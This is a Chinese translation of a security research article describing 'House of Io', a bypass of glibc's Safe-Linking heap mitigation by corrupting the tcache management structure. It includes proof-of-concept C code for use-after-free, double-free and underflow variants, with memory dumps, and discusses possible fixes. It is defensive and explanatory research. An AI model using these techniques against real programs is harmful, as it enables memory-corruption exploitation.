> 原文链接: https://www.anquanke.com//post/id/211325 


# 攻击Malloc Safe-Linking


                                阅读量   
                                **159088**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Awarau，文章来源：awaraucom.wordpress.com
                                <br>原文地址：[https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/](https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t011408690e9df61d7a.jpg)](https://p5.ssl.qhimg.com/t011408690e9df61d7a.jpg)



## 0x00 绪论

本文由作者和Safe-Linking机制的设计者Eyal共同撰写，描述绕过Safe-Linking并直接攻击tcache管理机制的方法。



## 0x01 Safe-Linking

Safe-Linking是一种安全缓解措施，旨在保护流行的malloc()实现中使用的缓冲区的单链表。此缓解措施已集成到uClibc-NG和GLibc中，并将于2020年8月以GLibc版本2.32交付。[此处](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/)充分说明了缓解措施，可保护tcache / fast-bins空闲列表的`next` / `fd`指针，通过对堆地址的计算来掩盖指针。

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"></a>代码实现

```
#define PROTECT_PTR(pos, ptr, type)  \
       ((type)((((size_t)pos) &gt;&gt; PAGE_SHIFT) ^ ((size_t)ptr)))

#define REVEAL_PTR(pos, ptr, type)   \
       PROTECT_PTR(pos, ptr, type)
```

这样，地址中的随机位（由ASLR随机分配）被放置在存储的受保护指针的低位的顶部，如该图所示：

[![](https://p1.ssl.qhimg.com/t01622bb5335c551245.png)](https://p1.ssl.qhimg.com/t01622bb5335c551245.png)

在此缓解措施出现之前，攻击者可以通过破坏空闲列表指针并将其指向任意地址来获得任意地址分配漏洞利用原语。Safe-Linking的设计使攻击者必须拥有堆指针泄漏原语才能实施此类攻击，因为堆泄漏后才能够正确地构建指向所选任意地址的掩码指针。



## 0x02 glibc的tcache设计

tcache（线程Cache）是GLibc的一个相对较新的功能，它为每个线程提供了各种小尺寸的短空闲列表。这种对常用缓冲区的线程cache使得在分配/释放缓冲区时无需给堆上锁，从而提高了整体性能。这是tcache的初始化方法的代码片段（[tcache_perthread_struct](https://repo.or.cz/glibc.git/blob/HEAD:/malloc/malloc.c#l2992)）：

```
tcache_init(void)
`{`
  mstate ar_ptr;
  void *victim = 0;
  const size_t bytes = sizeof (tcache_perthread_struct);

  if (tcache_shutting_down)
    return;

  arena_get (ar_ptr, bytes)
  victim = _int_malloc (ar_ptr, bytes);

  if (!victim &amp;&amp; ar_ptr != NULL)
  `{`

      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
  `}`


  if (ar_ptr != NULL)
    __libc_lock_unlock (ar_ptr-&gt;mutex);


  /* In a low memory situation, we may not be able to allocate memory
     - in which case, we just keep trying later.  However, we
     typically do this very early, so either there is sufficient
     memory, or there isn't enough memory to do non-trivial
     allocations anyway.  */

  if (victim)
  `{`

      tcache = (tcache_perthread_struct *) victim;
      memset (tcache, 0, sizeof (tcache_perthread_struct));

  `}`
`}`
```

已分配的`tcache_perthread_struct`如下：

```
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */

typedef struct tcache_entry
`{`
  struct tcache_entry *next;

  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;

`}` tcache_entry;


/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */

typedef struct tcache_perthread_struct
`{`
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];

`}` tcache_perthread_struct;
```

这意味着什么呢？这意味着TLS（特定于线程的变量）存储了指向`tcache_perthread_struct`的**指针**，该指针又通过对`_int_malloc()`的调用而存储在**堆**中。下面，我们可以看到分配了一个小缓冲区并对其进行`free()`释放，它被添加到tcache中后的内存dump：

```
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE)
[0x0000555555559010 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 …………….]

Chunk(addr=0x5555555592a0, size=0x30, flags=PREV_INUSE)
[0x00005555555592a0 00 00 00 00 00 00 00 00 10 90 55 55 55 55 00 00 ……….UUUU..]
```

从安全角度来看，混合数据和元数据是有风险的，这是最早攻击者用于破坏空闲列表结构的设计漏洞。因此，从安全角度来看，将tcache的**整个**管理元数据存储**在堆中**似乎不是一个很好的设计决定。



## 0x03 攻击计划——绕过Safe-Linking

如Safe-Linking的线程模型所述，缓解措施旨在防御利用以下漏洞利用原语的攻击者：
- 堆缓冲区上的受控线性缓冲区上溢/下溢
- 堆缓冲区上的相对任意写
此外，缓解措施使用next指针所在的堆地址掩盖（mask）了next指针。这意味着每个空闲列表的头部均**不受**保护，例如fast-bins的头部存储在libc的全局变量中，不过这依赖于实现。我们无法确定这种掩盖指针的方法是否有效（取决于实现），姑且认为头部存储在远离危险堆的地方，因此将指针进行掩盖似乎是多余的。

GLibc的不稳健设计选择与我（Eyal）在设计Safe-Linking时的错误假设相结合，导致了一个简单的绕过方法。我们将直接攻击tcache空闲列表的头部。

由于`tcache_perthread_struct`对象是在创建堆时分配的，它将直接存储在堆的开始处（相对较低的内存地址）。任何在堆缓冲区上具有受控的线性缓冲区**下溢**的攻击者，或相对的任意写入（能够使用**负的**相对偏移/索引）的攻击者，都可以利用它来破坏`tcache_perthread_struct`的整个结构。更具体地说，我们的攻击者将能够破坏他们想要的任何`tcache_entry` bin。

此外，攻击者还可以利用其他两种极端情况。 这些可以被认为是相对任意写入的特例。

a）对结构体指针项进行释放后使用（UAF）解引用并写入，偏移量为8个字节–这将解引用`key`字段，指向`tcache_perthread_struct`对象，然后在管理结构体顶部进行写入。

b）对`free()`的一组顺序不当的调用，使得结构体先被`free()`，然后a）里的指针被`free()`。这会将`tcache_perthread_struct`放置在对应于大小0x290的tcache链表上。

我们现在演示House of Io的变体：

### <a class="reference-link" name="UAF"></a>UAF

```
unsigned long victim = 1;

typedef struct hi `{`
        char *a;
        char *b;
`}`;

int main() 

`{`

        long int *a, *b, *z;
        struct hi *ptr = malloc(sizeof(ptr));


        ptr-&gt;a = malloc(10);
        ptr-&gt;b = malloc(10);
        free(ptr);

        //This is a UAF on a struct entry
        a = ptr-&gt;b;

        //set the count to n &gt; 1
        *a = 2;

        //get a pointer to target tc_idx
        //this is deterministic because tcache 
        //metadata chunk is an instance of its type. 
        z = (char *)a + 0x80;

        //set the list head to victim 
        //we could also spray this address  
        *z = &amp;victim; 

        //get the victim
        b = malloc(0x15);

        //set value at victim 
        *b = 2; 

        printf("%d\n", victim);
        return 0;
`}`
```

调用`free(ptr)`后，将在`key`字段处初始化`tcache_perthread_struct`的地址，该字段与`ptr-&gt;b`重叠：

```
0x5555555592a0: 0x0000000000000000      0x0000555555559010
0x5555555592b0: 0x0000000000000000      0x0000000000000021
0x5555555592c0: 0x0000000000000000      0x0000000000000000
0x5555555592d0: 0x0000000000000000      0x0000000000000021
0x5555555592e0: 0x0000000000000000      0x0000000000000000
0x5555555592f0: 0x0000000000000000      0x0000000000020d11
```

如果攻击者能够在`free(ptr)`之后解引用并写入`ptr-&gt;b`，则可以通过将目标地址（0x0000555555558010）放在目标列表的开头来破坏管理结构：

```
0x555555559010: 0x0000000000000002      0x0000000000000000
0x555555559020: 0x0000000000000000      0x0000000000000000
0x555555559030: 0x0000000000000000      0x0000000000000000
0x555555559040: 0x0000000000000000      0x0000000000000000
0x555555559050: 0x0000000000000000      0x0000000000000000
0x555555559060: 0x0000000000000000      0x0000000000000000
0x555555559070: 0x0000000000000000      0x0000000000000000
0x555555559080: 0x0000000000000000      0x0000000000000000
0x555555559090: 0x0000555555558010      0x0000000000000000
```

### <a class="reference-link" name="%E9%87%8A%E6%94%BE%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84"></a>释放管理结构

```
[...] 

        long int *a, *b, *z;
        struct hi *ptr = malloc(sizeof(ptr));

        ptr-&gt;a = malloc(10);
        ptr-&gt;b = malloc(10);


        free(ptr);
        free(ptr-&gt;a);
        free(ptr-&gt;b);

        a = malloc(0x285);

        [...]
```

在本例中，`tcache_perthread_struct`的地址传递给`free()`，然后放在tcache bin数组的索引39处（大小约为0x290的chunks）：

```
Tcachebins[idx=0, size=0x20] count=0  ←  Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE) 

Tcachebins[idx=39, size=0x290] count=1  ←  Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE)
```

随后调用`malloc()`就可以获得`tcache_perthread_struct`，如下演示中`a = malloc(0x285);`所做到的：

```
gef➤  p a 
$1 = (long *) 0x555555559010
```

这样就允许攻击者破坏tcache列表的头部。但是，由于后续`malloc()`调用的大小约束，本例不如缓冲区下溢或者UAF那么好利用。

### <a class="reference-link" name="%E4%B8%8B%E6%BA%A2"></a>下溢

```
[...] 

        long int *a, *b, *c, *z;

        a = malloc(20);
        b = malloc(0x3a0 - 0x10); 

        free(b);

        //underflow at arbitrary negative offset
        c = (a - 10);

        //corruption of last tcache entry
        *c = &amp;victim; 

        z = malloc(0x3a0 - 0x10);

        //arbitrary-write operation
        *z = 2;

        [...]
```

本例中，攻击者使用负索引从邻近的堆缓冲区下溢，破坏了`tcache_perthread_struct`。这里的负索引就是`(a - 10)`。但是如果程序逻辑允许的话，攻击者可以调整该负索引来攻击不同的tcache列表。

如上所示，Safe-Linking被设计来保护特定类型的原语攻击，但拥有这些原语的攻击者仍然能绕过保护，直接攻击tcache的主管理结构，从而获得任意地址分配原语。总之，如果攻击者能攻击tcache列表的头部，那么就可能绕过保护着`next`/`fd`指针的随机化机制。



## 0x04 修补措施——利与弊

分析攻击时，我们可以看到3个主要局限：
- 该攻击针对tcache，但仍无法绕过fast-bins保护。
- 该攻击仅适用于GLibc，因为uClibc-NG（目前）没有tcache。
- 攻击要求攻击者具有**下溢**原语，或者从结构体开头开始的特定偏移处的**UAF**，或允许攻击者将`tcache_perthread_struct`放置在tcache链表上的原语。
最后一点是关键。从统计上讲（至少从我们的经验来看），下溢要比普通的上溢漏洞少得多。此外，为了使这种攻击的`free()`变体在现实世界中可用，还需要满足一些极端情况-例如，对在结构中偏移8个字节的位置的指针字段的UAF，或者顺序错误的一组`free()`，或通过其他方法对指向`tcache_perthread_struct`的指针进行`free()`。

一种可能的修复方法是更新tcache的设计，将整个`tcache_perthread_struct`结构移动到线程存储中（而不是像今天那样仅在其中存储指向对象的指针）。但是，由于结构很大，因此这种设计更改将对内存使用产生不小的影响，并且很可能在将来的版本中将其更改为包含更多/更少的字段。

另一种可能的解决方案是掩盖tcache项数组中存储的指针。这样的更改将意味着保护将取决于元数据对象的位置。如果将来位置移动，则维护人员不太可能会记得相应地删除/更新此掩码（掩码取决于结构的位置）。此外，fast-bins不需要进行此类更改，并且每种空闲列表类型的设计都不同，这将更难于理解和维护，并且弊端可能大于给我们带来的好处。

考虑到所有这些因素后，我（Eyal）的个人建议就是保持现状。这将是Safe-Linking保护的一个已知漏洞，并且可能会被攻击者绕过。考虑到利用此遗留缺陷所需的原语，我选择接受此遗留缺陷。

没有“完美”的安全缓解措施，漏洞是必定存在的。在本文中，我们概述了Safe-Linking中的一个漏洞，原始的绕过思路和PoC完全归于Awarau ([@Awarau1](https://github.com/Awarau1))。
